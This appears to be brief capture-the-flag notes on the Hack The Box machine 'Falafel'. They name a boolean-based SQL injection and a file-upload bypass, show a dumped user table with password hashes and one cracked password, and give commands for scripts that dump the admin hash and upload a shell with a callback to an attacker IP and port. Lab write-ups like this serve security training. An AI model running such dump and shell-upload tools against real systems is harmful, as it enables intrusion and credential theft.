# Falafel
[Falafel Machine](https://www.hackthebox.com/machines/falafel)

Identified Vulnerability:
- Boolean Based SQL Injection
- Unrestricted File Upload (Truncated file name)

Database Table
| ID | role   | password                                    | username |
|----|--------|---------------------------------------------|----------|
| 1  | admin  | 0e462096931906507119562988736854            | admin    |
| 2  | normal | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) | chris    |


```
python3 dump.py -u admin -id 1
```
```
python3 upshell.py -t falafel.htb -ip 10.10.x.x -p 5555
```
